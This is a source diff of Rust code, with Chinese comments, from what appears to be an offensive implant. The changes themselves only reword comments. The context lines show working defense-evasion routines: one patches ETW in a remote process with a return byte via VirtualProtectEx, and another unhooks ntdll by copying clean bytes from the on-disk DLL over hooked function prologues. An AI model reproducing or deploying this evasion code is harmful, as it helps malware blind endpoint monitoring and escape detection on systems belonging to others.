@@ -58,13 +58,12 @@ pub unsafe fn patch_etw_remote(process_handle: HANDLE) {
             None => return,
         };
 
-        // ntdll 在所有進程的載入地址相同（ASLR 對 ntdll 是 per-boot，不是 per-process）
-        // 所以直接用自己進程取得的位址寫入遠端進程
+        // ntdll 在所有進程的載入地址相同 (ASLR 對 ntdll 是 per-boot 而不是 per-process)
         let patch_byte: u8 = 0xC3;
         let mut old_protect: u32 = 0;
         let mut bw: usize = 0;
 
-        // 先改遠端記憶體保護
+        // 改遠端記憶體保護
         VirtualProtectEx(
             process_handle,
             etw_ptr as *const _,
@@ -108,7 +107,7 @@ pub unsafe fn unhook_ntdll() {
     unsafe {
         debug!("[Unhook] Starting API unhooking...");
 
-        // 從磁碟讀取乾淨的 ntdll.dll
+        // 從硬碟讀取乾淨的 ntdll
         let ntdll_path = get_ntdll_path();
         let clean_ntdll = match fs::read(&ntdll_path) {
             Ok(b) => b,
@@ -119,7 +118,7 @@ pub unsafe fn unhook_ntdll() {
         };
         debug!("[Unhook] Read clean ntdll from: {}", ntdll_path);
 
-        // 用 goblin 解析磁碟版 ntdll 的 PE 結構
+        // 用 goblin 解析 PE 結構
         let clean_pe = match goblin::pe::PE::parse(&clean_ntdll) {
             Ok(p) => p,
             Err(e) => {
@@ -128,7 +127,7 @@ pub unsafe fn unhook_ntdll() {
             }
         };
 
-        // 找到磁碟版 ntdll 的 .text section
+        // 找到 ntdll 的 .text section
         let text_section = match clean_pe.sections.iter().find(|s| {
             let name = String::from_utf8_lossy(&s.name);
             name.starts_with(".text")
@@ -184,7 +183,7 @@ pub unsafe fn unhook_ntdll() {
                 continue;
             }
 
-            // 從磁碟版取得對應的乾淨位元組（前 8 bytes 足以覆蓋 jmp hook）
+            // 從 .text section 取得對應的位元組（前 8 bytes 即可覆蓋 jmp hook）
             let clean_offset = func_rva - text_rva;
             let clean_bytes = std::slice::from_raw_parts(clean_text_ptr.add(clean_offset), 8);
 
@@ -212,7 +211,7 @@ pub unsafe fn unhook_ntdll() {
                 &mut old_protect,
             );
 
-            // 還原乾淨位元組
+            // 還原位元組
             std::ptr::copy_nonoverlapping(clean_bytes.as_ptr(), func_ptr, 8);
 
             // 還原記憶體保護
